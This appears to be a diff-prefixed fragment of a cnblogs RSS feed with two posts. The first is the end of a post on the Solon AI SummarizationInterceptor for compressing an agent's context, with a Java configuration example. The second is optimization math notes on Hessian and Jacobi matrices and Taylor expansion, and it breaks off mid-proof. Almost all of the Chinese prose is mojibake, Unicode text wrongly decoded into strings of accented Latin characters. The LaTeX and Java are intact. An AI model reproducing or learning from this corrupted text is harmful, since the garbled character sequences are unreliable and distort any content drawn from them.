+<p>ä¸ºäºè®©ä½ åAIçå¯¹è¯è¯»èµ·æ¥æ´éé¡ºï¼ç®¡çåè¿ä¼åå¤åä¸æ­¥âäººæå³âçæ£æ¥ãå¦ææ¸çåçç¬¬ä¸æ¡è®°å½æ¯ä¸ä¸ªâè¡å¨ç»æâï¼ç®¡çåä¼ççå®åé¢æ¯ä¸æ¯ç´§è·çä¸æ¡AIçâæèè¿ç¨âï¼Thoughtï¼ãå¦ææ¯ï¼ä»ä¼æè¿æ¡âæèâä¹ä¸å¹¶çä¸ãè¿æ ·ä¸æ¥ï¼AIçå°çåå²æ°¸è¿æ¯ä»ä¸ä¸ªæèçæ®µå¼å§çï¼çè§£èµ·æ¥æ´èªç¶ã</p>
+<h4 id="ç¬¬åæ­¥è´´ä¸ªä¾¿å©è´´æéæ­è£æç¥">ç¬¬åæ­¥ï¼è´´ä¸ªâä¾¿å©è´´âæéï¼æ­è£æç¥ï¼</h4>
+<p>å¨æ°¸ä¹ä¿å­çâåå¿âååç¼©åçâæè¿è®°å¿âä¹é´ï¼ç®¡çåä¼è´´ä¸ä¸å¼ éç®ç <strong>âå°è´´å£«â</strong>ï¼</p>
+<pre><code>--- [ç³»ç»æç¤ºï¼ä¸­é´é¨ååå²å¯¹è¯å·²ä¼ååç¼©ï¼è¯·æ ¹æ®å½åè®¡ååå©ä½åå²ç»§ç»­ä»»å¡...] ---
+</code></pre>
+<p>è¿å¼ âå°è´´å£«âéå¸¸éè¦ï¼å®ç¨AIè½çè§£çè¯­è¨åè¯å®ï¼âå«æå¿ï¼ä¸­é´æäºç»èæå¸®ä½ ç²¾ç®äºï¼ä½ ä¸æ³¨ç¼åçä»»å¡åæ ¸å¿ç®æ å°±å¥½ãâè¿è½ææé²æ­¢AIå ä¸ºè®°å¿æ­å±èäº§çå°æåå¹»è§ã</p>
+<h3 id="3å¦ä½å®ç°æ éç»­èª">3ãå¦ä½å®ç°âæ éç»­èªâï¼</h3>
+<p>éè¿è¿å¥âè®°å¿ç®¡çæ¯âï¼SummarizationInterceptor æAIçåå­åæäºä¸ä¸ªå¨æçâæ°éä»£è°¢ç³»ç»âï¼</p>
+<ul>
+<li><strong>åå­æå®ï¼</strong> æ è®ºAIè¿è¡äº10æ­¥è¿æ¯1000æ­¥ï¼å®ä¸æ¬¡âæèâæéè¦å¤ççä¿¡æ¯éï¼Tokenæ°ï¼å§ç»ç»´æå¨ä¸ä¸ªå®å¨çèå´åã</li>
+<li><strong>é»è¾æ¸æ°ï¼</strong> å ä¸ºâåå­å¯¹é½âæºå¶ï¼AIçå°çæ¯ä¸æ®µè®°å¿é½æ¯å®æ´çâæè-è¡å¨-åé¦âé­ç¯ï¼é»è¾é¾æ¡éå¸¸ç¨³åºã</li>
+<li><strong>ç®æ æ°¸å­ï¼</strong> âç³»ç»è®¾å®âåâç¨æ·ä»»å¡âè¿ä¸¤å¤§æ ¸å¿ç®æ æ°¸è¿å¨çº¿ï¼AIæ°¸è¿ä¸ä¼å¿è®°âææ¯è°âåâæè¦å»åªâã</li>
+</ul>
+<h3 id="4æ´å¼ºå¤§çç»åæä»¶å¼çè®°å¿ç­ç¥">4ãæ´å¼ºå¤§çç»åï¼æä»¶å¼çè®°å¿ç­ç¥</h3>
+<p>è¿ä¸ªâè®°å¿ç®¡çå¨âæå¦çå°æ¹å¨äºï¼å®éç¨äº <strong>ç­ç¥æ¨¡å¼</strong>ï¼å°±åææºå¯ä»¥å®è£ä¸åçAPPæ¥æ©å±åè½ä¸æ ·ï¼ä½ å¯ä»¥ç»å®æ¥å¥ä¸åçâè®°å¿å¤çæä»¶âãæ¡æ¶å·²ç»ä¸ºæä»¬åå¤äºå æ¬¾å¼ºå¤§çæä»¶ï¼</p>
+<ul>
+<li><strong>å±çº§åç¼©å¨ï¼</strong> å®ä¼åæ»éªçä¸æ ·ï¼ææ§çè®°å¿æè¦åæ°çå¯¹è¯åå²ä¸æ­èåãåç¼©ï¼çæä¸ä¸ªå§ç»æ´æ°çâå¨å±è¿åº¦æè¦âï¼è®©è®°å¿åæ´è±ä¸æ ·å±å±åè£¹ï¼æ°¸ä¸ä¸¢å¤±æ ¸å¿ã</li>
+<li><strong>å³é®ä¿¡æ¯æåå¨ï¼</strong> å®åä¸ä¸ªä¿¡æ¯å®¡è®¡åï¼åªä»å¯¹è¯ä¸­æåææ ¸å¿çâå¹²è´§âï¼æ¯å¦ç¨æ·è¦æ±ãè·åå°çæ°æ®ãå·²ç»å¤±è´¥çå°è¯ç­ï¼è¿æ»¤æé£äºå°å¦çæèè¿ç¨ã</li>
+<li><strong>åéåºè®°å¿å¸ï¼</strong> å®ä¼å°è¢«æ¸ççè¯¦ç»å¯¹è¯âå½æ¡£âå°ä¸ä¸ªå·¨å¤§çç¥è¯åºéï¼åéæ°æ®åºï¼ãå½AIéè¦åå¿æä¸ªç»èæ¶ï¼å¯ä»¥éè¿ä¸ä¸ªä¸é¨çâå¬ååå²âå·¥å·ï¼åç¨æç´¢å¼æä¸æ ·æå®æ¾åæ¥ã</li>
+</ul>
+<p>ä½ å¯ä»¥æè¿äºæä»¶ç»åèµ·æ¥ä½¿ç¨ï¼æ¯å¦åå½æ¡£ï¼åæçº¯ï¼æååç¼©ï¼æé ä¸ä¸ªæéåä½ AIå©æçè®°å¿ç®¡çæ¹æ¡ã</p>
+<p>åºç¨ç¤ºä¾ï¼</p>
+<pre><code class="language-java">import org.noear.solon.ai.agent.react.ReActAgent;
+import org.noear.solon.ai.agent.react.intercept.SummarizationInterceptor;
+import org.noear.solon.ai.agent.react.intercept.summarize.*;
+import org.noear.solon.ai.agent.session.InMemoryAgentSession;
+import org.noear.solon.ai.chat.ChatModel;
+
+CompositeSummarizationStrategy compositeStrategy = new CompositeSummarizationStrategy();
+compositeStrategy.addStrategy(new KeyInfoExtractionStrategy(chatModel));
+compositeStrategy.addStrategy(new HierarchicalSummarizationStrategy(chatModel));
+SummarizationInterceptor summarizationInterceptor = new SummarizationInterceptor(12, compositeStrategy);
+
+ReActAgent agent = ReActAgent.of(chatModel)
+        .defaultInterceptorAdd(summarizationInterceptor)
+        .build();
+</code></pre>
+<h3 id="5æ»ç»">5ãæ»ç»</h3>
+<p><code>SummarizationInterceptor</code> çè®¾è®¡å²å­¦æ¯ï¼<strong>æå°ä¸¥å°è£åªï¼æé»è¾å°éå¿</strong>ã</p>
+<p>å®ä¸ä»ä»æ¯ä¸ä¸ªèçè®¡ç®èµæºçå·¥å·ï¼æ´æ¯AIè½å¤ä¿æé»è¾è¿è´¯ãå¤çè¶é¿å¤æä»»å¡çâæ¤èªèâãæäºå®ï¼å¼åèå¯ä»¥æ¾å¿å°è®©AIå©æå»å¤çé£äºéè¦å ä¸ªå°æ¶çè³å å¤©æè½å®æçãçæ­£å¤æåæºè½åçå·¥ä½ï¼èä¸ç¨æå¿å®ä¼ä¸­éâå¤±å¿âæâç²¾ç¥éä¹±âã</p>
+
+
+</div>
+<div class="clear"></div>
+
+            </div>
+            <div class="postDesc">posted @ 
+<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-19 12:22">2026-02-19 12:21</span>&nbsp;
+<a href="https://www.cnblogs.com/noear">å¸¦åºçåæ¤</a>&nbsp;
+éè¯»(<span id="post_view_count">68</span>)&nbsp;
+è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
+&nbsp;
+<a href="javascript:void(0)" onclick="AddToWz(19624614);return false;">æ¶è</a>&nbsp;
+<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19624614', targetLink: 'https://www.cnblogs.com/noear/p/19624614', title: 'èµäº AI Agent âæ éç»­èªâï¼è¯­ä¹ä¿æ¤åä¸ä¸æåç¼©ææ¯è§£æ' })">ä¸¾æ¥</a>
+</div>
+         ]]>
+    </description>
+    </item>
+<item>
+    <title><![CDATA[ å¸ä¼åæ°å­¦åºç¡ç¬è®°ï¼åï¼ï¼Hessian ç©éµå Taylor å±å¼ ]]></title>
+    <link>https://www.cnblogs.com/GeophysicsWorker/p/19624189</link>
+    <guid>c7519c70928cf4e87c4c894245c6519b</guid>
+    <description>
+    <![CDATA[ 
+            <h1 class="postTitle">
+                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/GeophysicsWorker/p/19624189" title="åå¸äº 2026-02-19 09:48">
+    <span role="heading" aria-level="2">å¸ä¼åæ°å­¦åºç¡ç¬è®°ï¼åï¼ï¼Hessian ç©éµå Taylor å±å¼</span>
+    
+
+</a>
+
+            </h1>
+            <div class="clear"></div>
+            <div class="postBody">
+                    <div id="cnblogs_post_description" style="display: none">
+        
+        ä¸ä¸èè¯´è¿ï¼æ¢¯åº¦ $\nabla f(\mathbf{X})$ æ¯$f(\mathbf{X})$ å³äº$\mathbf{X}$ çä¸é¶å¯¼æ°ï¼ç°å¨ä¸ä¸ªé®é¢$f(\mathbf{X})$ å³äº $\mathbf{X}$ çäºé¶å¯¼æ°æ¯ä»ä¹ï¼Hessian ç©éµï¼æµ·æ£®ç©éµï¼æ¯ä¸ä¸ªå¤åéå®å¼å½æ°$f(\mathbf{X})$çäºé¶å¯¼æ°ææå¾æ¹éµï¼å¶å ä½æä¹æ¯æè¿°äºä¸ä¸ªå¤åå½æ°æåºå½æ°çå±é¨æ²çãå¨æºå¨å­¦ä¹ ãä¼åé®é¢åç©çåæ¼é®é¢ä¸­ï¼Hessianç©éµæ®æ¼çéè¦çè§è²ï¼å°¤å¶æ¯å¨å¯»æ¾å½æ°çæå¼ç¹ï¼å¦æå¤±å½æ°æç®æ å½æ°çæå°å¼ï¼ååæç³»ç»çç¨³å®æ§ã
+    </div>
+<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
+<h2 id="1hessianç©éµå®ä¹åæ§è´¨">1.Hessianç©éµå®ä¹åæ§è´¨</h2>
+<p>â	å¨ä¸ä¸èè¯´è¿ï¼æ¢¯åº¦ <span class="math inline">\(\nabla f(\mathbf{X})\)</span> æ¯<span class="math inline">\(f(\mathbf{X})\)</span> å³äº<span class="math inline">\(\mathbf{X}\)</span> çä¸é¶å¯¼æ°ï¼ç°å¨ä¸ä¸ªé®é¢<span class="math inline">\(f(\mathbf{X})\)</span> å³äº <span class="math inline">\(\mathbf{X}\)</span> çäºé¶å¯¼æ°æ¯ä»ä¹ï¼Hessian ç©éµï¼æµ·æ£®ç©éµï¼æ¯ä¸ä¸ªå¤åéå®å¼å½æ°<span class="math inline">\(f(\mathbf{X})\)</span>çäºé¶å¯¼æ°ææå¾æ¹éµï¼å¶å ä½æä¹æ¯æè¿°äºä¸ä¸ªå¤åå½æ°æåºå½æ°çå±é¨æ²çãå¨æºå¨å­¦ä¹ ãä¼åé®é¢åç©çåæ¼é®é¢ä¸­ï¼Hessianç©éµæ®æ¼çéè¦çè§è²ï¼å°¤å¶æ¯å¨å¯»æ¾å½æ°çæå¼ç¹ï¼å¦æå¤±å½æ°æç®æ å½æ°çæå°å¼ï¼ååæç³»ç»çç¨³å®æ§ãä¸é¢æ¯å³äºHessianç©éµçè¯¦ç»ä»ç»ï¼</p>
+<p>â	<strong>Definition 4.1.1</strong>  è®¾<span class="math inline">\(f:\mathbb{R}^n\rightarrow{\mathbb{R}}\)</span> , <span class="math inline">\(\mathbf{X}\in{R}^n\)</span> ,å¦æ<span class="math inline">\(f\)</span>å¨ç¹<span class="math inline">\(\mathbf{X}_0\)</span> å¤å¯¹äºèªåé<span class="math inline">\(\mathbf{X}\)</span> çåä¸ªåé<span class="math inline">\(x_i,x_j\)</span> çäºé¶åå¯¼</p>
+<p></p><div class="math display">\[\frac{\part{f(\mathbf{X}_0)}}{\part{x_i}\part{x_j}} 		\hspace{2em} (i,j=1,2,...,n)
+\]</div><p></p><p>é½å­å¨ï¼åç§°å½æ°<span class="math inline">\(f\)</span> å¨ç¹<span class="math inline">\(\mathbf{X}_0\)</span> å¤äºé¶å¯å¯¼ï¼å¹¶ä¸ç§°ç©éµï¼</p>
+<p></p><div class="math display">\[\nabla^2f(\mathbf{X}_0)=\left(\begin{matrix}\frac{\part^2f(\mathbf{X}_0)}{\part{x_1^2}},&amp;\frac{\part^2f(\mathbf{X}_0)}{\part{x_1}\part{x_2}},&amp;\cdots,&amp;\frac{\part^2f(\mathbf{X}_0)}{\part{x_1}\part{x_n}}\\ 
+\frac{\part^2f(\mathbf{X}_0)}{\part{x_1}\part{x_2}},&amp;\frac{\part^2f(\mathbf{X}_0)}{\part{x_2^2}},&amp;\cdots,&amp;\frac{\part^2f(\mathbf{X}_0)}{\part{x_2}\part{x_n}}\\
+\cdots &amp;\cdots &amp;\cdots &amp;\cdots \\
+\frac{\part^2f(\mathbf{X}_0)}{\part{x_n}\part{x_1}},&amp;\frac{\part^2f(\mathbf{X}_0)}{\part{x_n}\part{x_2}},&amp;\cdots,&amp;\frac{\part^2f(\mathbf{X}_0)}{\part{x_n}^2}
+\end{matrix}\right)
+\tag{2}
+\]</div><p></p><p>æ¯<span class="math inline">\(f\)</span>å¨ç¹<span class="math inline">\(\mathbf{X}_0\)</span> å¤ç<strong>Hessianç©éµ</strong>ï¼è®°ä¸º<span class="math inline">\(\mathbf{H}_{ij}=\frac{\part^2{f}}{\part{x_i}\part{x_j}}\)</span>ã</p>
+<p>â	å¨æ°å­¦åæä¸­å·²ç»ç¥éï¼å½<span class="math inline">\(f\)</span> å¨ç¹<span class="math inline">\(\mathbf{X}_0\)</span> å¤çææäºé¶åå¯¼æ°ä¸ºè¿ç»­æ¶æï¼</p>
+<p></p><div class="math display">\[\frac{\part^2f(\mathbf{X}_0)}{\part{x_i}\part{x_j}}=\frac{\part^2{f(\mathbf{X}_0)}}{\part{x_j}\part{x_i}} \tag{3}
+\]</div><p></p><p>å æ­¤ï¼å¨è¿ç§æåµä¸Hessianç©éµæ¯<strong>å¯¹ç§°ç©éµ</strong>ã</p>
+<p><strong>æ¨è®º 1</strong> è®¾<span class="math inline">\(\mathbf{a}\in{\mathbf{R}^n},\mathbf{X}\in{\mathbf{R}^n},b\in{R}\)</span>ï¼æ±çº¿æ§å½æ°ï¼</p>
+<p></p><div class="math display">\[f(\mathbf{X})=\mathbf{a}^T\mathbf{X}+b\tag{4}
+\]</div><p></p><p>å¨ä»»æç¹<span class="math inline">\(\mathbf{X}\)</span> å¤çæ¢¯åº¦åéåHessianç©éµï¼</p>
+<p></p><div class="math display">\[\begin{aligned}
+&amp;\nabla{f(\mathbf{X})}=\mathbf{a}\\
+&amp;\nabla^2{f(\mathbf{X})}=\mathbf{0}
+\end{aligned}
+\tag{5}
+\]</div><p></p><p><strong>è¯  æï¼</strong> è®¾<span class="math inline">\(\mathbf{a}=[a_1,a_2,\cdots,a_n]^{T},\mathbf{X}=[x_1,x_2,\cdots,x_n]^{T}\)</span> åï¼</p>
+<p></p><div class="math display">\[f(x_1,x_2,\cdots,x_n)=\sum^{n}_{i=1}a_ix_i+b \tag{6}
+\]</div><p></p><p>æ ¹æ®æ¢¯åº¦åé<span class="math inline">\(\nabla{f}\)</span>çå®ä¹ï¼</p>
+<p></p><div class="math display">\[\nabla{f(\mathbf{X})}=\frac{\part{f}}{\part{x_i}}=a_i \hspace{2em} (i=1,2,\cdots,n) \tag{7}
+\]</div><p></p><p>ç±å¼ï¼7ï¼å¯ç¥ï¼</p>
+<p></p><div class="math display">\[\nabla{f(\mathbf{X})}=[a_1,a_2,\cdots,a_n]^T=\mathbf{a} \tag{8}
+\]</div><p></p><p>æ ¹æ®å¼ï¼2ï¼ç<span class="math inline">\(Hessian\)</span>ç©éµçå®ä¹ï¼</p>
+<p></p><div class="math display">\[\frac{\part^2{f}}{\part{x_i}\part{x_j}}=0, \hspace{2em} i,j=1,2,\cdots,n \tag{9}
+\]</div><p></p><p>æä»¥ï¼</p>
+<p></p><div class="math display">\[\nabla^2{f(\mathbf{X})}=\mathbf{0} \tag{10}
+\]</div><p></p><p><strong>æ¨è®º  2</strong>  è®¾<span class="math inline">\(\mathbf{A}\in{R^{n\times{n}}}\)</span> æ¯å¯¹ç§°å®æ¹éµï¼<span class="math inline">\(\mathbf{b}\in{\mathbf{R}^n},c\in\mathbf{R}^1\)</span> ,å¶äºæ¬¡å½æ°<span class="math inline">\(f(\mathbf{X})=\frac{1}{2}\mathbf{X}^T\mathbf{A}\mathbf{X}+\mathbf{b}^T\mathbf{X}+c\)</span> ,å¨ä»»æç¹å¤çæ¢¯åº¦åé<span class="math inline">\(\nabla{f(\mathbf{X})}\)</span> åHessianç©éµ <span class="math inline">\(\nabla^2f(\mathbf{X})\)</span> ä¸ºå¦ä¸å½¢å¼ï¼</p>
+<p></p><div class="math display">\[\begin{aligned}
+&amp;\nabla{f}=\mathbf{AX+b} \\
+&amp;\nabla^2{f}=\mathbf{A}
+\end{aligned}
+\tag{11}
+\]</div><p></p><p><strong>è¯ æï¼</strong> è®¾<span class="math inline">\(\mathbf{A}=[a_{ij}]_{n\times{n}}\)</span> ,<span class="math inline">\(\mathbf{X}=[x_1,x_2,...,x_n]^T\)</span>, <span class="math inline">\(\mathbf{b}=[b_1,b_2,...,b_n]^T\)</span> ,äºæ¬¡å½æ°<span class="math inline">\(f(\mathbf{X})\)</span> å¯ä»¥åæå¦ä¸å½¢å¼ï¼</p>
+<p></p><div class="math display">\[f(x_1,x_2,\cdots,x_n)=\frac{1}{2}\sum_{i=1}^{n}\sum_{j=1}^{n}a_{ij}x_ix_j+\sum_{i=1}^{n}b_ix_i+c \tag{12}
+\]</div><p></p><p>å°å®å¯¹åä¸ªåé <span class="math inline">\(x_i\)</span> (<span class="math inline">\(i=1,\cdots,n\)</span>) æ±åå¯¼æ°ï¼å¾å°ï¼</p>
+<p></p><div class="math display">\[\nabla{f(\mathbf{X})}=\left( \begin{matrix} \sum_{j=1}^n a_{1j}x_j+b_1\\
+\vdots \\\sum_{j=1}^{n}a_{n_j}x_j+b_n \end{matrix} \right)= \left(\begin{matrix}\sum_{j=1}^{n}a_{1j}x_j\\\vdots\\\sum_{j=1}^na_{nj}x_j\end{matrix}\right)+\left(\begin{matrix}b_1\\ \vdots \\b_n\end{matrix}\right) \tag{13}
+\]</div><p></p><p>æä»¥ï¼</p>
+<p></p><div class="math display">\[\nabla{f(\mathbf{X})}=\mathbf{AX+b} \tag{14}
+\]</div><p></p><p>åå¯¹å®ä»¬çæ±åå¯¼æ°æ¯ï¼</p>
+<p></p><div class="math display">\[ \frac{\part{f(\mathbf{X})}}{\part{x_i}\part{x_j}}=a_{ij} \tag{15}
+\]</div><p></p><p>æä»¥ï¼</p>
+<p></p><div class="math display">\[\nabla^2f(\mathbf{X})=\mathbf{A} \tag{16}
+\]</div><p></p><p>ä»¥ä¸ä¸¤ä¸ªä¾å­è¯´æï¼<span class="math inline">\(n\)</span>åå½æ°æ±å¯¼ä¸ä¸åå½æ°æ±å¯¼å¨å½¢å¼ä¸ä¸è´çï¼å³çº¿æ§å½æ°çä¸é¶å¯¼æ°çæ±å¯¼ä¸ºå¸¸åéï¼å¶äºé¶å¯¼æ°ä¸ºé¶ç©éµï¼èäºæ¬¡å½æ°çä¸é¶å¯¼æ°ä¸ºçº¿æ§åéå½æ°ï¼ å¶äºé¶å¯¼æ°ä¸ºå¸¸ç©éµã</p>
+<p>â	å¨æ­¤ä»ç»å¨ä»åçè®¡ç®ä¸­è¦ç¨å°çåéå½æ°çå¯¼æ°ã</p>
+<p>â	<strong>Definition 4.1.2</strong> è®¾ä¸ä¸ªåéå½æ°<span class="math inline">\(h:R^{n}\rightarrow{R^m}ï¼\mathbf{X}_0\in{R^n}\)</span>ï¼è®°<span class="math inline">\(h(\mathbf{X})=\{h_1(\mathbf{X}),h_2(\mathbf{X}),\cdots,h_m(\mathbf{X})\}^T\)</span>ï¼å¦æ<span class="math inline">\(h_i(i=1,2,\cdots,m)\)</span> å¨ç¹<span class="math inline">\(\mathbf{X}_0\)</span> å¤å¯¹äºèªåé<span class="math inline">\(\mathbf{X}=[x_1,x_2,x_3,\cdots,x_n]^T\)</span> çååéçåå¯¼æ°<span class="math inline">\(\frac{\part{h_i(\mathbf{X}_0)}}{\part{x_j}}\space(j=1,2,3,\cdots,m)\)</span> é½å­å¨ï¼åç§°åéå½æ°<span class="math inline">\(h(\mathbf{X})\)</span> å¨ç¹<span class="math inline">\(\mathbf{X}_0\)</span> å¤æ¯ä¸é¶å¯å¯¼çï¼å¹¶ä¸ç§°ç©éµï¼</p>
+<p></p><div class="math display">\[\nabla_{m\times{n}}h(\mathbf{X}_0)=\left[\begin{matrix} \frac{\part{h_1(\mathbf{X}_0)}}{\part{x_1}} &amp;\frac{\part{h_1(\mathbf{X}_0)}}{\part{x_2}} &amp;\cdots &amp;\frac{\part{h_1(\mathbf{X}_0)}}{\part{x_n}} \\ \frac{\part{h_2(\mathbf{X}_0)}}{\part{x_1}} &amp;\frac{\part{h_2(\mathbf{X}_0)}}{\part{x_2}} &amp;\cdots &amp;\frac{\part{h_2(\mathbf{X}_0)}}{\part{x_n}}\\ \cdots &amp;\cdots &amp;\cdots &amp;\cdots \\ \frac{\part{h_m(\mathbf{X}_0)}}{\part{x_1}}   &amp;\frac{\part{h_2(\mathbf{X}_0)}}{\part{x_2}} &amp;\cdots &amp;\frac{\part{h_2(\mathbf{X}_0)}}{\part{x_n}} \end{matrix}\right] \tag{17}
+\]</div><p></p><p>æ¯<span class="math inline">\(h\)</span>å¨ç¹<span class="math inline">\(X_0\)</span> å¤çä¸é¶å¯¼æ°æJacobi ç©éµï¼ç®è®°ä¸º</p>
+<p></p><div class="math display">\[\nabla{\mathbf{h}(\mathbf{X}_0)}=\nabla_{m\times{n}}\mathbf{h}(\mathbf{X}_0) \tag{18}
+\]</div><p></p><p>ç±äº<span class="math inline">\(n\)</span>åå½æ°<span class="math inline">\(f:\mathbf{R}^n\rightarrow \mathbf{R}^1\)</span> çæ¢¯åº¦æ¯åéå½æ°:</p>
+<p></p><div class="math display">\[\nabla{f(\mathbf{X})}=\left[\frac{\part{f(\mathbf{X})}}{\part{x_1}},...,\frac{\part{f(\mathbf{X})}}{\part{x_n}}\right]^T 
+\tag{19}
+\]</div><p></p><p>æä»¥<span class="math inline">\(\nabla f(\mathbf{X})\)</span> çä¸é¶å¯¼æ°æJacobi ç©éµä¸ºï¼</p>
+<p></p><div class="math display">\[\begin{aligned}
+\nabla_{n\times{n}}\nabla{f(\mathbf{X})}&amp;=\left[\begin{matrix}\frac{\part}{\part{x_1}}\left(\frac{\part{f(\mathbf{X})}}{\part{x_1}}\right) &amp;\frac{\part}{\part{x_2}}\left(\frac{\part{f(\mathbf{X})}}{\part{x_1}}\right) &amp;\cdots &amp;\frac{\part}{\part{x_n}}\left(\frac{\part{f(\mathbf{X})}}{\part{x_1}}\right)\\
+\frac{\part}{\part{x_1}}\left(\frac{\part{f(\mathbf{X})}}{\part{x_2}}\right) &amp;\frac{\part}{\part{x_2}}\left(\frac{\part{f(\mathbf{X})}}{\part{x_2}}\right) &amp;\cdots &amp;\frac{\part}{\part{x_n}}\left(\frac{\part{f(\mathbf{X})}}{\part{x_2}}\right)\\
+\cdots &amp;\cdots &amp;\cdots &amp;\cdots \\
+\frac{\part}{\part{x_1}}\left(\frac{\part{f(\mathbf{X})}}{\part{x_n}}\right) &amp;\frac{\part}{\part{x_2}}\left(\frac{\part{f(\mathbf{X})}}{\part{x_n}}\right) &amp;\cdots &amp;\frac{\part}{\part{x_n}}\left(\frac{\part{f(\mathbf{X})}}{\part{x_n}}\right)
+\end{matrix}\right]\\
+&amp;=\left[\begin{matrix}\frac{\part^2{f(\mathbf{X})}}{\part{x_1^2}} &amp;\frac{\part^2{f(\mathbf{X})}}{\part{x_1x_2}} &amp;\cdots &amp;\frac{\part^2{f(\mathbf{X})}}{\part{x_1x_n}}\\
+\frac{\part^2{f(\mathbf{X})}}{\part{x_1x_2}} &amp;\frac{\part^2{f(\mathbf{X})}}{\part{x_2^2}} &amp;\cdots &amp;\frac{\part^2{f(\mathbf{X})}}{\part{x_2x_n}}\\
+\cdots &amp;\cdots &amp;\cdots &amp;\cdots\\
+\frac{\part^2{f(\mathbf{X})}}{\part{x_1x_n}} &amp;\frac{\part^2{f(\mathbf{X})}}{\part{x_2x_n}} &amp;\cdots &amp;\frac{\part^2{f(\mathbf{X})}}{\part{x_n^2}}
+\end{matrix}\right]\\
+&amp;=\nabla^2{f(\mathbf{X})}
+\end{aligned}
+\tag{20}
+\]</div><p></p><p>å³ï¼</p>
+<p></p><div class="math display">\[\nabla_{n\times{n}}\nabla{f(\mathbf{X})}=\nabla^2f(\mathbf{X}) \tag{21}
+\]</div><p></p><p>æ®æ­¤ï¼ä»ä¸å¼çå¾ç¥ï¼å½æ°æ¢¯åº¦çJacobiçç©éµä¸ºæ­¤å½æ°<span class="math inline">\(f(\mathbf{X})\)</span> çHessianç©éµã</p>
+<p>ä¸é¢ç»åºå¸¸ç¨Jacobiç©éµçå ä¸ªå¬å¼åæ¨è®ºï¼</p>
+<ol>
+<li><span class="math inline">\(\nabla{\mathbf{c}_{n\times1}}=\mathbf{0}_{n\times{n}}\)</span> ï¼å¶ä¸­<span class="math inline">\(\mathbf{c}\)</span> æ¯åéå¨é¨ä¸ºå¸¸éç<span class="math inline">\(n\)</span>ç»´åéï¼<span class="math inline">\(\mathbf{0}\)</span> æ¯<span class="math inline">\(n\times{n}\)</span> é¶é¶åéï¼</li>
+<li><span class="math inline">\(\nabla{\mathbf{X}}=\mathbf{I}\)</span>ï¼å¶ä¸­<span class="math inline">\(\mathbf{X}\)</span> æ¯<span class="math inline">\(n\)</span>ç»´åéï¼<span class="math inline">\(I\)</span> ä¸º<span class="math inline">\(n\times{n}\)</span> é¶åä½ç©éµï¼</li>
+<li><span class="math inline">\(\nabla{\mathbf{AX}}=\mathbf{A}^T\)</span>ï¼å¶ä¸­<span class="math inline">\(\mathbf{A}\)</span>æ¯<span class="math inline">\(m\times{n}\)</span>é¶ç©éµï¼</li>
+<li>è®¾ <span class="math inline">\(\phi{(t)}=f(\mathbf{X}_0+t\mathbf{P})\)</span>ï¼å¶ä¸­<span class="math inline">\(f:\mathbf{R}^n\rightarrow\mathbf{R}^{1}\)</span>, <span class="math inline">\(\phi:\mathbf{R}\rightarrow\mathbf{R}\)</span>ï¼å<span class="math inline">\(\phi^{\prime}(t)=\nabla f(\mathbf{X}_0+t\mathbf{P})^T\mathbf{P}\)</span>, <span class="math inline">\(\phi^{\prime\prime}=\mathbf{P}^T\nabla^2{f(\mathbf{X}_0+t\mathbf{P})}\mathbf{P}\)</span></li>
+</ol>
+<h2 id="2å¤åå½æ°çtaylorå±å¼">2.å¤åå½æ°çTaylorå±å¼</h2>
+<p>â	å¤åå½æ°çTaylorå±å¼å¼å¨æä¼åæ¹æ³ä¸­æ¯ååéè¦çï¼è®¸å¤æ¹æ³åå¶æ¶ææ¹æ³çè¯ææ¯ä»å¶åºåï¼è¿éç»åºTaylorå±å¼å®çåå¶è¯æãTaylorå±å¼è¿ä¼¼å¯ä»¥ææå°å°å¤æå½æ°åä¸ºäºæ¬¡å½æ°ã</p>
+<p>â	<strong>å® ç 4.2.1</strong> è®¾<span class="math inline">\(f:\mathbf{R}^{n}\rightarrow\mathbf{R}\)</span> å·æäºé¶è¿ç»­åå¯¼æ°ï¼å</p>
+<p></p><div class="math display">\[f(\mathbf{X}+\mathbf{P})=f(\mathbf{X})+\nabla{f(\mathbf{X})}^T\mathbf{P}+\frac{1}{2}\mathbf{P}^T\nabla^2f(\overline{\mathbf{X}})\mathbf{P} \tag{22}
+\]</div><p></p><p>å¶ä¸­ï¼<span class="math inline">\(\overline{\mathbf{X}}=\mathbf{X}+\theta\mathbf{P}(\theta\in{(0,1)})\)</span>ã</p>
+<p><strong>è¯  æ</strong>ï¼è®¾ <span class="math inline">\(\psi(t)=f(\mathbf{X}+t\mathbf{P})\)</span> å¶ä¸­ <span class="math inline">\(t\in[0,1]\)</span>:</p>
+<p></p><div class="math display">\[\psi(0)=f(\mathbf{X}) ï¼ \psi(1)=f(\mathbf{X}+\mathbf{P}) \tag{23}
+\]</div><p></p><p>å¯¹<span class="math inline">\(\psi(t)\)</span> æç§ä¸åå½æ°å¨<span class="math inline">\(t=0\)</span>ç¹å±å¼ï¼å¾å°ä¸å¼ï¼</p>
+<p></p><div class="math display">\[   \psi(t)=\psi(0)+\psi^{\prime}(0)t+\frac{1}{2}\psi^{\prime\prime}(\theta t)t^2 \tag{24}
+\]</div><p></p><p>å¶ä¸­ <span class="math inline">\(\theta\in(0,1)\)</span>ãä»¤<span class="math inline">\(t=1\)</span>ï¼äºæ¯</p>
+<p></p><div class="math display">\[\psi(1)=\psi(0)+\psi^{\prime}(0)+\frac{1}{2}\psi^{\prime\prime}(\theta) \tag{25}
+\]</div><p></p><p>åå ä¸ºä¸èä¸­ <span class="math inline">\(\psi^{\prime}(\theta)=\nabla{f(\mathbf{X})}^T\mathbf{P},\psi^{\prime\prime}(\theta)=\mathbf{P}^T\nabla^2f(\mathbf{X}+\theta{\mathbf{P}})\mathbf{P}\)</span> ï¼ä»£å¥å¼ï¼25ï¼ä¸­å¾å°ï¼</p>
+<p></p><div class="math display">\[f(\mathbf{X}+\mathbf{P})=f(\mathbf{X})+\nabla{f(\mathbf{X})}^T\mathbf{P}+\frac{1}{2}\mathbf{P}^T\nabla^2f(\mathbf{X}+\theta\mathbf{P})\mathbf{P} \tag{26}
+\]</div><p></p><p>å¼ï¼26ï¼è¿å¯ä»¥åæï¼</p>
